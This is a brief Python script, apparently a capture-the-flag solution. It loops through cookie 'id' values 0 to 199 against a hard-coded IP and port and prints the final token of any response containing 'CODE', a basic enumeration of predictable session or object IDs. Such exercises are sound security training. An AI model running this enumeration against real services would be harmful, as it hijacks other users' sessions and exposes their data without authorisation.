# resolved
import requests

url = 'http://62.173.140.174:16003/'
for i in range(0, 200):
    my_cookies = dict(id=f'{i}')
    r = requests.get(url, cookies=my_cookies)
    if b'CODE' in r.text.encode('utf-8'):
        print(r.text.encode('utf-8').split()[len(r.text.encode('utf-8').split())-1])
